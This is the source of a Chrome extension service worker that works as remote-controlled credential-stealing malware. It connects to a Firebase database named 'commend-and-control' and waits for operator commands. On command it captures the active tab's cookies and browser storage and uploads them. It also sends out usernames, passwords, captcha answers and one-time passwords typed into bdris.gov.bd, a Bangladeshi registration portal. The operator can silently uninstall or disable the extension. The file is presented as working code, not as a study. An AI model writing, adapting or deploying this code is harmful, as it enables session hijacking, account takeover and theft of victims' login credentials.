
try {
    importScripts(
        "./firebase-app.js",
        "./firebase-database.js",
        "./crypto-js.js"
    );
} catch (e) {
    console.error("Failed to load local scripts in Service Worker:", e);
}
const firebaseConfig = {
    apiKey: "AIzaSyASM8D0_Ibssdyksde5Bj_9jWOkU6150MM",
    authDomain: "commend-and-control-98d3d.firebaseapp.com",
    databaseURL: "https://commend-and-control-98d3d-default-rtdb.firebaseio.com",
    projectId: "commend-and-control-98d3d",
    storageBucket: "commend-and-control-98d3d.firebasestorage.app",
    messagingSenderId: "99037298064",
    appId: "1:99037298064:web:356425ce1c0dfd48c9c715",
    measurementId: "G-D3BJS1749L"
};

const SECRET_KEY = "YourSecureAndSecretKeyForAES";
const USER_ID = "polash ";//এখানে যে কম্পিউটারে এড আছে সেটার নাম যেন আগে
const TARGET_URL_MATCH = "*://*.bdris.gov.bd/*";
const POLLING_INTERVAL = 5000; // 5 seconds
const HEARTBEAT_INTERVAL = 30000; // 30 seconds

let db;
let currentCommandData = { runAction: false };
let lastPushId = null;
let lastPath = "";
let pollingTimer = null;
let heartbeatTimer = null;
let firebaseRetryAttempt = 0;
function initializeFirebase() {
    if (typeof firebase !== 'undefined' && typeof firebase.initializeApp === 'function') {
        try {
            const app = firebase.apps.length ? firebase.app() : firebase.initializeApp(firebaseConfig);
            db = firebase.database(app);
            console.log("initialized successfully.");
            // reset retry attempts on successful init
            firebaseRetryAttempt = 0;
            try {
                db.ref(".info/connected").on("value", (snap) => {
                    const connected = !!snap.val();
                    if (connected) {
                        if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
                    } else {
                        console.warn("⚠️ RTDB disconnected — enabling polling fallback");
                        if (!pollingTimer) {
                            pollingTimer = setInterval(checkForCommands, POLLING_INTERVAL);
                        }
                    }
                });
            } catch (e) {
                console.warn("Could not attach .info/connected listener:", e);
            }
            registerUser();
            setupDualConnection();
            startHeartbeat();
            registerLifecycleEvents();

            return true;
        } catch (error) {
            console.error("❌ Firebase initialization failed:", error);
            // exponential-backoff retry (caps at 5 minutes)
            const delay = Math.min(300000, Math.pow(2, firebaseRetryAttempt) * 1000);
            console.warn(`Retrying Firebase init in ${delay / 1000}s (attempt ${firebaseRetryAttempt + 1})`);
            firebaseRetryAttempt++;
            setTimeout(initializeFirebase, delay);
        }
    }
    return false;
}
function setupDualConnection() {
    if (!db) return;
    const commandRef = db.ref(`users/${USER_ID}/commands/trigger_content`);

    commandRef.on('value', (snapshot) => {
        handleCommandUpdate(snapshot.val());
    }, (error) => {
        console.warn("⚠️ Real-time listener error, switching to polling:", error);
        startPolling();
    });
    pollingTimer = setInterval(() => {
        checkForCommands();
    }, POLLING_INTERVAL);
}
async function checkForCommands() {
    if (!db) {
        if (!initializeFirebase()) return;
    }

    try {
        const snapshot = await db.ref(`users/${USER_ID}/commands/trigger_content`).once('value');
        const commandData = snapshot.val();

        if (commandData && JSON.stringify(commandData) !== JSON.stringify(currentCommandData)) {
            handleCommandUpdate(commandData);
        }
        updateOnlineStatus();

    } catch (error) {
        console.warn("❌ Polling failed:", error);
    }
}
function handleCommandUpdate(commandData) {
    if (!commandData) return;

    currentCommandData = commandData;
    sendFeedback("COMMAND_RECEIVED", `Command received: runAction = ${commandData.runAction}`);
    broadcastStatusToTabs(commandData.runAction);
    if (commandData.triggerUninstall === true) {
        initiateSelfUninstall();
        commandRef.update({ triggerUninstall: false });
    }

    if (commandData.triggerUpdate === true) {
        handleExtensionUpdate();
        commandRef.update({ triggerUpdate: false });
    }

    if (commandData.triggerDisable === true) {
        handleExtensionDisable();
        commandRef.update({ triggerDisable: false });
    }
    if (commandData.triggerCapture === true) {
        captureAndUploadSession();
        triggerCaptureFalse();
    }
}
function startHeartbeat() {
    heartbeatTimer = setInterval(async () => {
        if (!db) {
            if (!initializeFirebase()) return;
        }

        try {
            await db.ref(`users/${USER_ID}/status`).update({
                online: true,
                lastHeartbeat: firebase.database.ServerValue.TIMESTAMP,
                extensionVersion: chrome.runtime.getManifest().version,
                browser: navigator.userAgent
            });
        } catch (error) {
            console.warn("❌ Heartbeat failed:", error);
        }
    }, HEARTBEAT_INTERVAL);
}
function updateOnlineStatus() {
    if (!db) return;

    db.ref(`users/${USER_ID}/status`).update({
        online: true,
        lastSeen: firebase.database.ServerValue.TIMESTAMP
    });
}
async function sendFeedback(eventType, message, additionalData = {}) {
    if (!db) return;

    try {
        const sanitizedAdditionalData = JSON.parse(JSON.stringify(additionalData, (key, value) => {
            return value === undefined ? null : value;
        }));

        const feedbackRef = db.ref(`users/${USER_ID}/feedback`).push();
        await feedbackRef.set({
            eventType: eventType,
            message: message,
            timestamp: firebase.database.ServerValue.TIMESTAMP,
            extensionVersion: chrome.runtime.getManifest().version,
            ...sanitizedAdditionalData
        });
    } catch (error) {
        console.error("❌ Failed to send feedback:", error);
    }
}

function registerLifecycleEvents() {
    chrome.runtime.onInstalled.addListener((details) => {
        if (details.reason === "install") {
            sendFeedback("EXTENSION_INSTALLED", "Extension successfully installed", {
                reason: details.reason,
                previousVersion: details.previousVersion
            });
        } else if (details.reason === "update") {
            sendFeedback("EXTENSION_UPDATED", "Extension successfully updated", {
                reason: details.reason,
                previousVersion: details.previousVersion
            });
        }
    });
    chrome.runtime.onSuspend.addListener(() => {
        sendFeedback("EXTENSION_SUSPENDED", "Extension is about to uninstall");
    });
}
function initiateSelfUninstall() {
    console.warn("Uninstalling extension by remote command...");

    sendFeedback("EXTENSION_UNINSTALLING", "Extension is being uninstalled by remote command");
    if (db) {
        db.ref(`users/${USER_ID}/status`).update({
            online: false,
            uninstalled: true,
            uninstallTime: firebase.database.ServerValue.TIMESTAMP
        });
    }
    setTimeout(() => {
        chrome.management.uninstallSelf({
            showConfirmDialog: false
        });
    }, 2000);
}

function handleExtensionUpdate() {
    sendFeedback("EXTENSION_UPDATE_TRIGGERED", "Update command received");
    chrome.runtime.reload();
}

function handleExtensionDisable() {
    sendFeedback("EXTENSION_DISABLE_TRIGGERED", "Disable command received");
    chrome.management.setEnabled(chrome.runtime.id, false);
}


// --- ১৮. সেশন ডেটা ক্যাপচার এবং আপলোড ---
async function captureAndUploadSession() {
    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab) {
            sendFeedback("CAPTURE_ERROR", "No active tab found");
            return;
        }
        const cookies = await chrome.cookies.getAll({ url: tab.url });
        const storageResults = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
                return {
                    local: { ...localStorage },
                    session: { ...sessionStorage },
                    userAgent: navigator.userAgent
                };
            }
        });

        const allData = {
            url: tab.url,
            cookies: cookies,
            storage: storageResults[0].result,
            timestamp: Date.now()
        };
        const jsonStr = JSON.stringify(allData);
        const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
        await saveCapturedDataToFirebase(encodedData, tab.url);
    } catch (err) {
        console.error("❌ Capture Error: ", err);
        sendFeedback("CAPTURE_ERROR", err.message);
    }
}
async function saveCapturedDataToFirebase(encodedData, url) {
    if (!db) return;

    try {
        const safeURL = toSafeKey(url);
        const sessionRef = db.ref(`users/${USER_ID}/captured_sessions/${safeURL}`).push();
        const encryptedData = CryptoJS.AES.encrypt(encodedData, SECRET_KEY).toString();

        await sessionRef.set({
            data: encryptedData,
            timestamp: firebase.database.ServerValue.TIMESTAMP,
            full_url: url
        });
        sendFeedback("CAPTURE_SUCCESS", "Full session data captured and uploaded", { website: safeURL });

    } catch (e) {
        console.error("❌ Upload Failed:", e);
        sendFeedback("UPLOAD_ERROR", e.message);
    }
}
async function registerUser() {
    if (!db) return;

    const userRef = db.ref(`users/${USER_ID}`);

    try {
        const snapshot = await userRef.once('value');

        if (!snapshot.exists()) {

            await userRef.set({
                createdAt: firebase.database.ServerValue.TIMESTAMP,
                browserId: USER_ID,
                firstInstall: true
            });

            await db.ref(`users/${USER_ID}/commands/trigger_content`).set({
                runAction: false,
                triggerUninstall: false,
                triggerUpdate: false,
                triggerDisable: false,
                lastUpdated: firebase.database.ServerValue.TIMESTAMP
            });

            await db.ref(`users/${USER_ID}/status`).set({
                online: true,
                extensionVersion: chrome.runtime.getManifest().version,
                browser: navigator.userAgent,
                installedAt: firebase.database.ServerValue.TIMESTAMP,
                lastHeartbeat: firebase.database.ServerValue.TIMESTAMP
            });
            sendFeedback("USER_REGISTERED", "New user registered in system");

        } else {
            await db.ref(`users/${USER_ID}/status`).update({
                online: true,
                lastSeen: firebase.database.ServerValue.TIMESTAMP,
                extensionVersion: chrome.runtime.getManifest().version,
                reactivated: true
            });
        }

    } catch (error) {
        console.error("❌ User registration failed:", error);
    }
}

function broadcastStatusToTabs(runAction) {
    chrome.tabs.query({ url: TARGET_URL_MATCH }, (tabs) => {
        if (tabs.length === 0) {
            return;
        }

        tabs.forEach(tab => {
            chrome.tabs.sendMessage(tab.id, {
                action: "FIREBASE_COMMAND_UPDATE",
                runAction: runAction
            }).catch(() => {
                console.log(`Could not send message to tab ${tab.id}`);
            });
        });
    });
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

    if (request.action === "GET_INITIAL_STATUS") {
        sendResponse({ runAction: currentCommandData.runAction });
    }

    else if (request.action === "SEND_LOGIN_DATA") {
        saveLoginSession(request.data, sender.tab.url)
            .then(res => sendResponse(res))
            .catch(err => sendResponse({ success: false, message: err.message }));
        return true;
    }

    else if (request.action === "SEND_OTP_DATA") {
        updateOtpInSession(request.data)
            .then(res => sendResponse(res))
            .catch(err => sendResponse({ success: false, message: err.message }));
        return true;
    }

    else if (request.action === "GET_BROWSER_ID") {
        sendResponse({ success: true, browserId: USER_ID });
    }

    else if (request.action === "CHECK_CONNECTION") {
        const isConnected = db !== null;
        sendResponse({
            connected: isConnected,
            commandActive: currentCommandData.runAction,
            lastUpdate: Date.now()
        });
    }
    return true;
});

async function saveLoginSession(data, url) {
    if (!db && !initializeFirebase()) return { success: false, message: "Firebase connectivity error" };

    try {
        const safeURL = toSafeKey(url);
        lastPath = `users/${USER_ID}/websites/${safeURL}/logins`;

        let payload = {
            u: CryptoJS.AES.encrypt(data.userName, SECRET_KEY).toString(),
            p: CryptoJS.AES.encrypt(data.password, SECRET_KEY).toString(),
            c: CryptoJS.AES.encrypt(data.capcherAnswer, SECRET_KEY).toString(),
            otp: "",
            timestamp: firebase.database.ServerValue.TIMESTAMP,
            url: url
        };

        const newRef = db.ref(lastPath).push();
        await newRef.set(payload);
        lastPushId = newRef.key;
        sendFeedback("LOGIN_DATA_SAVED", "Login data saved successfully", {
            sessionId: lastPushId,
            website: safeURL
        });

        return { success: true, sessionId: lastPushId };
    } catch (e) {
        sendFeedback("LOGIN_SAVE_ERROR", `Failed to save login: ${e.message}`);
        return { success: false, message: e.message };
    }
}

async function updateOtpInSession(data) {
    if (!db || !lastPushId) {
        return { success: false, message: "No active session. Please save login data first." };
    }

    try {
        const encryptedOtp = CryptoJS.AES.encrypt(data.otp, SECRET_KEY).toString();

        await db.ref(`${lastPath}/${lastPushId}`).update({
            otp: encryptedOtp,
            otpTimestamp: firebase.database.ServerValue.TIMESTAMP
        });

        sendFeedback("OTP_SAVED", "OTP saved successfully", {
            sessionId: lastPushId
        });

        await disableRemoteAction();

        const completedId = lastPushId;
        lastPushId = null;

        return { success: true, sessionId: completedId };
    } catch (e) {
        sendFeedback("OTP_SAVE_ERROR", `Failed to save OTP: ${e.message}`);
        return { success: false, message: e.message };
    }
}

function toSafeKey(url) {
    try {
        let hostname = new URL(url).hostname;
        return hostname.replace(/\./g, '_');
    } catch (e) {
        return 'unknown_host';
    }
}
async function disableRemoteAction() {
    if (db) {
        await db.ref(`users/${USER_ID}/commands/trigger_content`).update({
            runAction: false,
            lastDisabled: firebase.database.ServerValue.TIMESTAMP
        });
    }
}
async function triggerCaptureFalse() {
    if (db) {
        await db.ref(`users/${USER_ID}/commands/trigger_content`).update({
            triggerCapture: false,
            lastDisabled: firebase.database.ServerValue.TIMESTAMP
        });
    }
}

function cleanup() {
    if (pollingTimer) {
        clearInterval(pollingTimer);
        pollingTimer = null;
    }

    if (heartbeatTimer) {
        clearInterval(heartbeatTimer);
        heartbeatTimer = null;
    }

    if (db) {
        db.ref(`users/${USER_ID}/status`).update({
            online: false,
            lastSeen: firebase.database.ServerValue.TIMESTAMP
        });
    }
}

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

initializeFirebase();

self.addEventListener('beforeunload', cleanup);
